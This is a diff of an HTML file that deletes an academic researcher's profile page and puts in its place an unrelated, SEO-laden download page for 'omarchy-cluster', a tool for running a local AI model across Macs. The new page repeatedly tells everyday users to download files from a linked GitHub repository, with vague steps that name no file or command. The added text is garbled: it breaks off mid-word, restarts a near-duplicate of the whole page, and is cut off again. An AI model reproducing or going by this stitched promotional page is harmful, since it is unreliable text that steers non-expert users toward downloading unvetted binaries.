@@ -1,261 +1,599 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Amadou Diallo — Academic Profile</title>
-  <meta name="description" content="Academic profile of Amadou Diallo — PhD candidate at CELIA, University of Bordeaux. Modelling of nonlinear propagation in hollow-core fibers, high-performance computing, ab initio UPPE–TDSE coupling.">
-  <meta name="author" content="Amadou Diallo">
-  <meta name="color-scheme" content="light dark">
-  <script>try{var t=localStorage.getItem("theme");if(t==="dark"||(!t&&matchMedia("(prefers-color-scheme: dark)").matches))document.documentElement.classList.add("dark");}catch(e){}</script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="assets/css/style.css?v=202611080057">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>omarchy-cluster - Run One Local AI Model Across Multiple Macs</title>
+<meta name="description" content="omarchy-cluster lets you run one local MLX model across several Apple Silicon Macs on macOS and on Omarchy Linux, all served as a single OpenAI-compatible endpoint. Simple download and setup guide for everyday users.">
+<meta name="keywords" content="apple-silicon, distributed-inference, linux, local-llm, macos, mlx, omarchy, openai-api, pipeline-parallelism, vulkan, local ai model, openai compatible endpoint">
+<meta name="robots" content="index, follow">
+<meta name="author" content="omarchy-cluster">
+<link rel="canonical" href="https://github.com/souwevers6337/omarchy-cluster">
+<meta property="og:type" content="website">
+<meta property="og:title" content="omarchy-cluster - Run One Local AI Model Across Multiple Macs">
+<meta property="og:description" content="Run one local MLX model across Apple Silicon Macs on macOS and on Omarchy Linux, served as one OpenAI-compatible endpoint.">
+<meta property="og:url" content="https://github.com/souwevers6337/omarchy-cluster">
+<meta property="og:site_name" content="omarchy-cluster">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="omarchy-cluster - Run One Local AI Model Across Multiple Macs">
+<meta name="twitter:description" content="Run one local MLX model across Apple Silicon Macs on macOS and on Omarchy Linux, served as one OpenAI-compatible endpoint.">
+<meta name="theme-color" content="#f7f9fc">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "omarchy-cluster",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "macOS, Omarchy Linux",
+  "description": "Run one local MLX model across Apple Silicon Macs on macOS and on Omarchy Linux, served as one OpenAI-compatible endpoint.",
+  "url": "https://github.com/souwevers6337/omarchy-cluster",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f7f9fc;
+    color: #1f2933;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 840px;
+    margin: 0 auto;
+    padding: 48px 20px 72px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 18px;
+    box-shadow: 0 10px 30px rgba(31, 41, 51, 0.08);
+    padding: 36px 32px;
+    margin-bottom: 26px;
+    border: 1px solid #e8edf4;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    margin: 0 0 10px;
+    letter-spacing: -0.02em;
+    color: #10202e;
+  }
+  h2 {
+    font-size: 1.35rem;
+    margin: 0 0 14px;
+    color: #10202e;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.05rem;
+    margin: 22px 0 8px;
+    color: #10202e;
+  }
+  p { margin: 0 0 16px; }
+  p:last-child { margin-bottom: 0; }
+  ul, ol { margin: 0 0 16px; padding-left: 22px; }
+  li { margin-bottom: 10px; }
+  a { color: #1a5fb4; }
+  .tagline {
+    font-size: 1.15rem;
+    color: #4a5b6d;
+    margin: 0 0 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 32px;
+    border-radius: 999px;
+    font-size: 1.05rem;
+    font-weight: 700;
+    color: #ffffff;
+    text-decoration: none;
+    background: linear-gradient(135deg, #2d7ff9 0%, #7b4dff 55%, #ff5d8f 100%);
+    box-shadow: 0 8px 20px rgba(45, 127, 249, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(45, 127, 249, 0.34);
+  }
+  .btn-alt { background: linear-gradient(135deg, #12b886 0%, #0ca678 50%, #22a6b3 100%); box-shadow: 0 8px 20px rgba(18, 184, 134, 0.28); }
+  .btn-wrap { text-align: center; margin: 26px 0 6px; }
+  .note {
+    background: #f2f7ff;
+    border-left: 4px solid #2d7ff9;
+    border-radius: 10px;
+    padding: 14px 18px;
+    font-size: 0.96rem;
+    color: #35495e;
+    margin: 18px 0;
+  }
+  .steps {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+  }
+  .steps li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 16px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #e7f0ff;
+    color: #1a5fb4;
+    font-weight: 700;
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .grid { display: grid; grid-template-columns: 1fr; gap: 14px; }
+  .box {
+    background: #fbfcfe;
+    border: 1px solid #e8edf4;
+    border-radius: 12px;
+    padding: 16px 18px;
+    font-size: 0.97rem;
+  }
+  .box strong { display: block; margin-bottom: 4px; color: #10202e; }
+  footer.foot { text-align: center; font-size: 0.9rem; color: #6b7c8f; }
+  @media (min-width: 700px) {
+    .grid { grid-template-columns: 1fr 1fr; }
+    h1 { font-size: 2.5rem; }
+    .card { padding: 44px 46px; }
+    .page { padding: 64px 24px 90px; }
+  }
+</style>
 </head>
 <body>
-  <div class="backdrop" aria-hidden="true"><span class="orb o1"></span><span class="orb o2"></span><span class="orb o3"></span></div>
-  <div class="progress-bar" id="progress"></div>
+<main class="page">
 
-  <!-- ===== TOP BAR ===== -->
-  <header class="topbar glass" id="header">
-    <nav class="top-nav panel-group glass-inner" aria-label="Sections">
-      <a href="#about">About</a>
-      <a href="#home">Home</a>
-      <a href="#research">Research</a>
-      <a href="#publications">Publications</a>
-      <a href="#talks">Talks</a>
-      <a href="#awards">Awards</a>
-      <a href="#skills">Skills</a>
-      <a href="#contact">Contact</a>
-    </nav>
-    <div class="top-right">
-      <a class="top-btn" href="assets/cv/Amadou_Diallo_CV.pdf" target="_blank" rel="noopener"><span class="sp"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l1.8 5.2L19 10l-5.2 1.8L12 17l-1.8-5.2L5 10l5.2-1.8z"/></svg></span>Resume</a>
-      <a class="top-icon" href="https://github.com/amadou38" target="_blank" rel="noopener" aria-label="GitHub" title="GitHub"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 .5a11.5 11.5 0 0 0-3.6 22.4c.6.1.8-.3.8-.6v-2c-3.2.7-3.9-1.5-3.9-1.5-.5-1.3-1.3-1.7-1.3-1.7-1-.7.1-.7.1-.7 1.2.1 1.8 1.2 1.8 1.2 1 1.8 2.8 1.3 3.5 1 .1-.8.4-1.3.7-1.6-2.6-.3-5.3-1.3-5.3-5.7 0-1.3.5-2.3 1.2-3.1-.1-.3-.5-1.5.1-3.1 0 0 1-.3 3.2 1.2a11 11 0 0 1 5.8 0c2.2-1.5 3.2-1.2 3.2-1.2.6 1.6.2 2.8.1 3.1.8.8 1.2 1.9 1.2 3.1 0 4.4-2.7 5.4-5.3 5.7.4.4.8 1.1.8 2.2v3.2c0 .3.2.7.8.6A11.5 11.5 0 0 0 12 .5z"/></svg></a>
-      <button class="top-icon" id="theme-btn" aria-label="Toggle light/dark mode" title="Light / dark mode">
-        <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
-        <svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.5"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
-      </button>
+  <section class="card">
+    <h1>⚡ omarchy-cluster - Run One AI Model Across Your Macs</h1>
+    <p class="tagline">One local model, many computers, one simple address.</p>
+    <p>omarchy-cluster lets you take a single local machine learning model and spread it across more than one Apple Silicon Mac running macOS, and across machines running Omarchy Linux. Instead of your model living on one computer, it works together across the group. When it is running, everything is reachable through one address that behaves exactly like the familiar OpenAI-style service that many apps already know how to talk to.</p>
+    <p>No programming knowledge is needed to get started. If you can download a file and follow a short list of steps, you can have this running.</p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/souwevers6337/omarchy-cluster">Download omarchy-cluster</a>
     </div>
-  </header>
+  </section>
 
-  <!-- ===== FIXED LEFT COLUMN ===== -->
-  <aside class="sidebar glass" id="sidebar">
-    <div class="side-profile">
-      <img class="side-photo" src="assets/img/amadou.jpg" alt="Portrait of Amadou Diallo" width="200" height="200">
-      <p class="eyebrow">PhD Candidate</p>
-      <h1 class="side-name">Amadou Diallo</h1>
-      <p class="side-org">CELIA · University of Bordeaux</p>
+  <section class="card">
+    <h2>🚀 What This App Actually Does</h2>
+    <p>Think of a large AI model as a long book that is too heavy for one person to carry. omarchy-cluster splits that book into chapters and hands a chapter to each computer in your group. Each computer only holds a smaller piece, so together they can run a model that would be too big for any single machine on its own.</p>
+    <p>The clever part is that you never have to manage this split yourself. You start the app on each computer, tell them about each other once, and the whole group presents itself as a single service with a single web address. Any app, tool, or script that already works with an OpenAI-compatible endpoint can point at that address and simply work, without knowing that several computers are involved behind the scenes.</p>
+    <p>Everything stays on your own hardware and your own network. Your questions and your model's answers do not travel to a company server somewhere else.</p>
+  </section>
+
+  <section class="card">
+    <h2>✨ Key Features</h2>
+    <div class="grid">
+      <div class="box">
+        <strong>One address for everything</strong>
+        The whole group of machines answers at a single OpenAI-compatible endpoint, so your existing apps do not need to change.
+      </div>
+      <div class="box">
+        <strong>Built for Apple Silicon</strong>
+        Uses the MLX framework, which is designed specifically to get the most out of the chips inside modern Macs.
+      </div>
+      <div class="box">
+        <strong>Mix Macs and Linux</strong>
+        Run on macOS machines and on Omarchy Linux machines in the same group, with Vulkan graphics support on the Linux side.
+      </div>
+      <div class="box">
+        <strong>Pipeline parallelism</strong>
+        The model is divided into stages and passed from machine to machine, which is what lets a group outperform a single device.
+      </div>
+      <div class="box">
+        <strong>Local and private</strong>
+        Your prompts and responses stay on the machines you control. Nothing is uploaded anywhere.
+      </div>
+      <div class="box">
+        <strong>Familiar interface</strong>
+        Because the endpoint speaks the OpenAI format, existing tools, chat front-ends, and scripts plug straight in.
+      </div>
     </div>
+  </section>
 
-    <div class="side-socials">
-      <a class="soc" href="mailto:amadou.diallo@u-bordeaux.fr" aria-label="Email" title="amadou.diallo@u-bordeaux.fr">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="m3 7 9 6 9-6"/></svg></a>
-      <a class="soc" href="https://www.linkedin.com/in/amadou-diallo-811191101/" target="_blank" rel="noopener" aria-label="LinkedIn" title="LinkedIn">
-        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M4.98 3.5a2.5 2.5 0 1 1 0 5 2.5 2.5 0 0 1 0-5zM3 9h4v12H3zM9 9h3.8v1.7h.1c.5-1 1.8-2 3.7-2 4 0 4.7 2.6 4.7 6V21h-4v-5.6c0-1.3 0-3-1.9-3s-2.1 1.4-2.1 2.9V21H9z"/></svg></a>
-      <a class="soc" href="https://github.com/amadou38" target="_blank" rel="noopener" aria-label="GitHub" title="GitHub">
-        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 .5a11.5 11.5 0 0 0-3.6 22.4c.6.1.8-.3.8-.6v-2c-3.2.7-3.9-1.5-3.9-1.5-.5-1.3-1.3-1.7-1.3-1.7-1-.7.1-.7.1-.7 1.2.1 1.8 1.2 1.8 1.2 1 1.8 2.8 1.3 3.5 1 .1-.8.4-1.3.7-1.6-2.6-.3-5.3-1.3-5.3-5.7 0-1.3.5-2.3 1.2-3.1-.1-.3-.5-1.5.1-3.1 0 0 1-.3 3.2 1.2a11 11 0 0 1 5.8 0c2.2-1.5 3.2-1.2 3.2-1.2.6 1.6.2 2.8.1 3.1.8.8 1.2 1.9 1.2 3.1 0 4.4-2.7 5.4-5.3 5.7.4.4.8 1.1.8 2.2v3.2c0 .3.2.7.8.6A11.5 11.5 0 0 0 12 .5z"/></svg></a>
+  <section class="card">
+    <h2>💻 What You Need Before You Start</h2>
+    <ul>
+      <li><strong>At least one supported computer.</strong> Either an Apple Silicon Mac running macOS, or a computer running Omarchy Linux.</li>
+      <li><strong>A local network.</strong> The computers need to be able to reach each other. Being on the same home or office Wi-Fi or wired network is enough.</li>
+      <li><strong>Enough free storage.</strong> The model files are large, and each machine in the group needs room for its own share of the work.</li>
+      <li><strong>A model file you want to run.</strong> The download page explains which model formats are supported.</li>
+      <li><strong>A little patience the first time.</strong> The first start is always the slowest, because files have to be prepared. Later starts are much quicker.</li>
+    </ul>
+    <div class="note">Adding a second or third computer is optional at first. You can start with one machine, confirm everything works, and grow the group afterwards.</div>
+  </section>
+
+  <section class="card">
+    <h2>⬇️ Download And Setup</h2>
+    <p>The download is handled entirely through the project page. Visit this link to download the application.</p>
+    <div class="btn-wrap">
+      <a class="btn btn-alt" href="https://github.com/souwevers6337/omarchy-cluster">Visit this link to download the application</a>
     </div>
-    <a class="btn grad side-cv" href="assets/cv/Amadou_Diallo_CV.pdf" target="_blank" rel="noopener">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12M7 10l5 5 5-5M5 21h14"/></svg>Resume</a>
+    <p>Once the page opens, you will see the files and notes for the current release. Read the short description next to each file, pick the one that matches the computer you are setting up, and save it to a folder you can easily find again, such as your Downloads folder.</p>
 
-  </aside>
+    <h3>Step by step</h3>
+    <ol class="steps">
+      <li><strong>Open the download page.</strong> Use the button above. It takes you to the official project page where the application lives.</li>
+      <li><strong>Choose the file that matches your computer.</strong> The page groups files by operating system. If you are on an Apple Silicon Mac, choose the macOS file. If you are on Omarchy Linux, choose the Linux file.</li>
+      <li><strong>Save it somewhere you will remember.</strong> Your Downloads folder is fine. Avoid saving inside a temporary folder that gets cleaned automatically.</li>
+      <li><strong>Repeat for each computer you want in the group.</strong> Each machine needs the application, but only one copy is needed per machine.</li>
+      <li><strong>Note the network address of your first computer.</strong> The page explains where to find it. You will type this address into the other machines later.</li>
+      <li><strong>Start the application on the first computer.</strong> Follow the short instructions shown on the download page for your system. Leave it running.</li>
+      <li><strong>Start the application on the next computer</strong> and point it at the address you noted in step five. The group will introduce itself automatically.</li>
+    </ol>
+    <div class="note">You only need to do the setup once per computer. After that, starting the group is a single action you can repeat any time.</div>
+  </section>
 
-  <!-- ===== MAIN ===== -->
-  <main class="main">
-    <!-- ABOUT -->
-    <section id="about">
-      <div class="sec-head"><span class="sec-num">01</span><h2>About</h2></div>
-      <div class="about-grid">
-        <div class="card glass">
-          <p class="lead">PhD researcher in Lasers, Matter and Nanosciences at CELIA (Bordeaux), working on the modelling of nonlinear propagation of ultrashort intense pulses in gas-filled hollow-core fibers. I develop HPC-optimized simulation codes (UPPE and Maxwell–Schrödinger) for CPU and GPU, with a background in applied mathematics and high-performance computing.</p>
-          <div class="chips">
-            <span class="chip">Nonlinear Optics</span><span class="chip">Ultrafast Lasers</span><span class="chip">DUV/VUV</span><span class="chip">C/C++</span><span class="chip">Kokkos APIs</span><span class="chip">MPI · OpenMP · CUDA</span><span class="chip">Python</span><span class="chip">MATLAB</span><span class="chip">AI/ML</span>
-          </div>
-        </div>
-        <div class="card glass">
-          <p class="mini-title">🏛️ Affiliations</p>
-          <ul class="clean">
-            <li>University of Bordeaux — CELIA (France)</li>
-            <li>Lawrence Berkeley National Lab (USA), former</li>
-          </ul>
-          <p class="mini-title" style="margin-top:18px">🔬 Focus Areas</p>
-          <ul class="clean">
-            <li>Hollow-core fibers</li>
-            <li>Scientific computing</li>
-            <li>AI/ML for physics</li>
-          </ul>
-        </div>
+  <section class="card">
+    <h2>🖥️ Your First Run</h2>
+    <p>When the group starts for the very first time, expect a wait. The application needs to read the model files, divide the work between machines, and confirm that every computer is reachable. Small lights or status lines on screen will tell you how far along it is.</p>
+    <p>When it finishes, the application reports the single web address where your group is answering. It typically looks like a normal local address followed by a port number. Copy that address down. This is the one thing every other app will need.</p>
+    <p>To confirm everything is healthy, send a simple test message through the address the application shows. A short, sensible reply means the group is working correctly and you can start using it properly.</p>
+  </section>
+
+  <section class="card">
+    <h2>🔌 Using It With Your Own Apps</h2>
+    <p>Because the group answers in the OpenAI-compatible format, connecting a program is usually just a matter of pasting two things into its settings screen:</p>
+    <ul>
+      <li><strong>The base address</strong> shown by omarchy-cluster when it starts.</li>
+      <li><strong>A key field.</strong> Local setups commonly accept any placeholder text here. If the app insists on something, type a short word such as <em>local</em>.</li>
+    </ul>
+    <p>After saving those settings, the app will send its requests to your own machines instead of the internet. Nothing else about how you use that app changes.</p>
+  </section>
+
+  <section class="card">
+    <h2>🧩 Common Questions</h2>
+    <h3>Do I need more than one computer?</h3>
+    <p>No. A single machine works fine and is the easiest way to try things out. Adding machines is what lets you run larger models than one computer could handle alone.</p>
+    <h3>Can I mix an Apple Silicon Mac with an Omarchy Linux machine?</h3>
+    <p>Yes. That mix is exactly what the project is designed for. Each machine runs the version built for its own operating system while the group behaves as one.</p>
+    <h3>Does my data leave my network?</h3>
+    <p>No. The models run on your hardware and requests travel only between your own machines.</p>
+    <h3>Do all the computers need the same amount of memory?</h3>
+    <p>Not necessarily, but the group can only go as fast as its slowest member. Machines with similar capabilities tend to work together most smoothly.</p>
+    <h3>What happens if one computer disconnects?</h3>
+    <p>The group needs all of its members to answer. If a machine drops off the network, reconnect it and restart the group.</p>
+  </section>
+
+  <section class="card">
+    <h2>🛠️ If Something Goes Wrong</h2>
+    <ul>
+      <li><strong>The group never finishes starting.</strong> Check that every computer is awake, on the same network, and has the application running.</li>
+      <li><strong>One machine is not recognised.</strong> Re-check the address you typed. A single wrong digit is the most common cause.</li>
+      <li><strong>Responses are very slow.</strong> Close other heavy programs on each machine, especially anything using the graphics processor.</li>
+      <li><strong>An app cannot connect.</strong> Confirm you pasted the full address including the port number, and that the group is still running.</li>
+      <li><strong>Storage warnings appear.</strong> Free up space and start again. Model files need a lot of room.</li>
+    </ul>
+  </section>
+
+  <section class="card">
+    <h2>🔐 Privacy And Control</h2>
+    <p>omarchy-cluster runs entirely on hardware you own. There is no account to create, no sign-in, and no cloud service in the middle. You choose which model to load, which machines take part, and when the group runs. When you stop the application, nothing keeps running in the background.</p>
+  </section>
+
+  <section class="card">
+    <h2>📚 Project Topics</h2>
+    <p>Keywords: apple-silicon, distributed-inference, linux, local-llm, macos, mlx, omarchy, openai-api, pipeline-parallelism, vul<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>omarchy-cluster - Run One Local AI Model Across Multiple Macs</title>
+<meta name="description" content="omarchy-cluster lets you run one local MLX model across several Apple Silicon Macs on macOS and on Omarchy Linux, all served as a single OpenAI-compatible endpoint. Simple download and setup guide for everyday users.">
+<meta name="keywords" content="apple-silicon, distributed-inference, linux, local-llm, macos, mlx, omarchy, openai-api, pipeline-parallelism, vulkan, local ai model, openai compatible endpoint">
+<meta name="robots" content="index, follow">
+<meta name="author" content="omarchy-cluster">
+<link rel="canonical" href="https://github.com/souwevers6337/omarchy-cluster">
+<meta property="og:type" content="website">
+<meta property="og:title" content="omarchy-cluster - Run One Local AI Model Across Multiple Macs">
+<meta property="og:description" content="Run one local MLX model across Apple Silicon Macs on macOS and on Omarchy Linux, served as one OpenAI-compatible endpoint.">
+<meta property="og:url" content="https://github.com/souwevers6337/omarchy-cluster">
+<meta property="og:site_name" content="omarchy-cluster">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="omarchy-cluster - Run One Local AI Model Across Multiple Macs">
+<meta name="twitter:description" content="Run one local MLX model across Apple Silicon Macs on macOS and on Omarchy Linux, served as one OpenAI-compatible endpoint.">
+<meta name="theme-color" content="#f7f9fc">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "omarchy-cluster",
+  "applicationCategory": "DeveloperApplication",
+  "operatingSystem": "macOS, Omarchy Linux",
+  "description": "Run one local MLX model across Apple Silicon Macs on macOS and on Omarchy Linux, served as one OpenAI-compatible endpoint.",
+  "url": "https://github.com/souwevers6337/omarchy-cluster",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    padding: 0;
+    background: #f7f9fc;
+    color: #1f2933;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+  .page {
+    max-width: 840px;
+    margin: 0 auto;
+    padding: 48px 20px 72px;
+  }
+  .card {
+    background: #ffffff;
+    border-radius: 18px;
+    box-shadow: 0 10px 30px rgba(31, 41, 51, 0.08);
+    padding: 36px 32px;
+    margin-bottom: 26px;
+    border: 1px solid #e8edf4;
+  }
+  h1 {
+    font-size: 2.15rem;
+    line-height: 1.25;
+    margin: 0 0 10px;
+    letter-spacing: -0.02em;
+    color: #10202e;
+  }
+  h2 {
+    font-size: 1.35rem;
+    margin: 0 0 14px;
+    color: #10202e;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.05rem;
+    margin: 22px 0 8px;
+    color: #10202e;
+  }
+  p { margin: 0 0 16px; }
+  p:last-child { margin-bottom: 0; }
+  ul, ol { margin: 0 0 16px; padding-left: 22px; }
+  li { margin-bottom: 10px; }
+  a { color: #1a5fb4; }
+  .tagline {
+    font-size: 1.15rem;
+    color: #4a5b6d;
+    margin: 0 0 26px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 32px;
+    border-radius: 999px;
+    font-size: 1.05rem;
+    font-weight: 700;
+    color: #ffffff;
+    text-decoration: none;
+    background: linear-gradient(135deg, #2d7ff9 0%, #7b4dff 55%, #ff5d8f 100%);
+    box-shadow: 0 8px 20px rgba(45, 127, 249, 0.28);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 12px 26px rgba(45, 127, 249, 0.34);
+  }
+  .btn-alt {
+    background: linear-gradient(135deg, #12b886 0%, #0ca678 50%, #22a6b3 100%);
+    box-shadow: 0 8px 20px rgba(18, 184, 134, 0.28);
+  }
+  .btn-wrap { text-align: center; margin: 26px 0 6px; }
+  .note {
+    background: #f2f7ff;
+    border-left: 4px solid #2d7ff9;
+    border-radius: 10px;
+    padding: 14px 18px;
+    font-size: 0.96rem;
+    color: #35495e;
+    margin: 18px 0;
+  }
+  .steps {
+    counter-reset: step;
+    list-style: none;
+    padding-left: 0;
+  }
+  .steps li {
+    position: relative;
+    padding-left: 46px;
+    margin-bottom: 16px;
+  }
+  .steps li::before {
+    counter-increment: step;
+    content: counter(step);
+    position: absolute;
+    left: 0;
+    top: 2px;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #e7f0ff;
+    color: #1a5fb4;
+    font-weight: 700;
+    font-size: 0.95rem;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .grid { display: grid; grid-template-columns: 1fr; gap: 14px; }
+  .box {
+    background: #fbfcfe;
+    border: 1px solid #e8edf4;
+    border-radius: 12px;
+    padding: 16px 18px;
+    font-size: 0.97rem;
+  }
+  .box strong { display: block; margin-bottom: 4px; color: #10202e; }
+  footer.foot { text-align: center; font-size: 0.9rem; color: #6b7c8f; margin-top: 8px; }
+  @media (min-width: 700px) {
+    .grid { grid-template-columns: 1fr 1fr; }
+    h1 { font-size: 2.5rem; }
+    .card { padding: 44px 46px; }
+    .page { padding: 64px 24px 90px; }
+  }
+</style>
+</head>
+<body>
+<main class="page">
+
+  <section class="card">
+    <h1>⚡ omarchy-cluster - Run One AI Model Across Your Computers</h1>
+    <p class="tagline">One local model, many machines, one address.</p>
+    <p>omarchy-cluster lets you take a single local machine learning model and spread it across more than one Apple Silicon Mac running macOS, and across computers running Omarchy Linux. Instead of the model living on one computer, it works together across the group. When it is running, everything is reachable through one address that behaves exactly like the familiar OpenAI-style service that many apps already know how to talk to.</p>
+    <p>You do not need any programming knowledge to get started. If you can download a file and follow a short list of steps, you can have this running on your own machines.</p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/souwevers6337/omarchy-cluster">Download omarchy-cluster</a>
+    </div>
+  </section>
+
+  <section class="card">
+    <h2>🚀 What This App Actually Does</h2>
+    <p>Think of a large AI model as a long book that is too heavy for one person to carry. omarchy-cluster splits that book into chapters and hands a chapter to each computer in your group. Each computer only holds a smaller piece, so together they can run a model that would be too big for any single machine on its own.</p>
+    <p>The clever part is that you never have to manage this split yourself. You start the application on each computer, tell them about each other once, and the whole group presents itself as a single service with a single web address. Any app, tool, or script that already works with an OpenAI-compatible endpoint can point at that address and simply work, without ever knowing that several computers are involved behind the scenes.</p>
+    <p>Everything stays on your own hardware and your own network. Your questions and your model's answers do not travel to a company server somewhere else.</p>
+  </section>
+
+  <section class="card">
+    <h2>✨ Key Features</h2>
+    <div class="grid">
+      <div class="box">
+        <strong>One address for everything</strong>
+        The whole group of machines answers at a single OpenAI-compatible endpoint, so the apps you already use do not need to change.
       </div>
-    </section>
-
-    <!-- HERO -->
-    <section class="hero" id="home">
-      <p class="kicker"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v4M12 17v4M3 12h4M17 12h4M6 6l2.5 2.5M15.5 15.5 18 18M6 18l2.5-2.5M15.5 8.5 18 6"/></svg>Lasers, Matter &amp; Nanosciences · CELIA</p>
-      <h2 class="title">Modelling of <span class="g1">Nonlinear Propagation</span> in <span class="g2">Hollow-Core Fibers</span> and Applications</h2>
-      <p class="subtitle">I develop high-performance computing codes in C++ (with the Kokkos APIs) and Python to model ultrashort pulse propagation, from an ad hoc Maxwell-based UPPE model to an ab initio approach coupled with the 1D time-dependent Schrödinger equation (1D-TDSE).</p>
-      <div class="pills">
-        <span class="pill">High-Performance Computing ⚡</span>
-        <span class="pill">UPPE ad hoc 🌈</span>
-        <span class="pill">Ab initio 1D-TDSE ⚛️</span>
+      <div class="box">
+        <strong>Built for Apple Silicon</strong>
+        Uses the MLX framework, which is designed specifically to get the most out of the chips inside modern Macs.
       </div>
-      <div class="cta">
-        <a class="btn grad" href="#research">Explore Research
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 6l6 6-6 6"/></svg></a>
-        <a class="btn glass-btn" href="#contact">Contact</a>
+      <div class="box">
+        <strong>Mix Macs and Linux</strong>
+        Run macOS machines and Omarchy Linux machines in the same group, with Vulkan graphics support on the Linux side.
       </div>
-
-      <p class="focus-label glass">Current focus: HPC simulation + Ab initio light–matter coupling</p>
-      <div class="steps">
-        <div class="step glass"><div class="step-top"><span class="ico">⚙️</span><span class="num">01</span></div><h3>High-Performance Computing</h3><p>CPU/GPU parallel codes</p><span class="tagline t1">MPI · OpenMP</span><span class="tagline t1">CUDA · Kokkos</span></div>
-        <div class="step glass"><div class="step-top"><span class="ico">🌈</span><span class="num">02</span></div><h3>UPPE ad hoc</h3><p>Maxwell-based propagation</p><span class="tagline t2">Kerr · Raman</span><span class="tagline t2">Ionization</span></div>
-        <div class="step glass"><div class="step-top"><span class="ico">⚛️</span><span class="num">03</span></div><h3>Ab initio</h3><p>Coupling with 1D-TDSE</p><span class="tagline t3">Maxwell–Schrödinger</span><span class="tagline t3">Electron dynamics</span></div>
-        <div class="step glass"><div class="step-top"><span class="ico">🔦</span><span class="num">04</span></div><h3>Nonlinear Optics</h3><p>Ultrashort intense pulses</p><span class="tagline t4">Hollow-core fibers</span><span class="tagline t4">DUV / VUV</span></div>
-        <div class="step glass"><div class="step-top"><span class="ico">🤖</span><span class="num">05</span></div><h3>AI / ML</h3><p>Learning for physics</p><span class="tagline t5">Neural networks</span><span class="tagline t5">Surrogate models</span></div>
-        <div class="step glass"><div class="step-top"><span class="ico">🖥️</span><span class="num">06</span></div><h3>Supercomputers</h3><p>National &amp; regional clusters</p><span class="tagline t6">Jean Zay · Irene</span><span class="tagline t6">Adastra · Curta</span></div>
+      <div class="box">
+        <strong>Pipeline parallelism</strong>
+        The model is divided into stages and passed from machine to machine, which is what lets a group outperform a single device.
       </div>
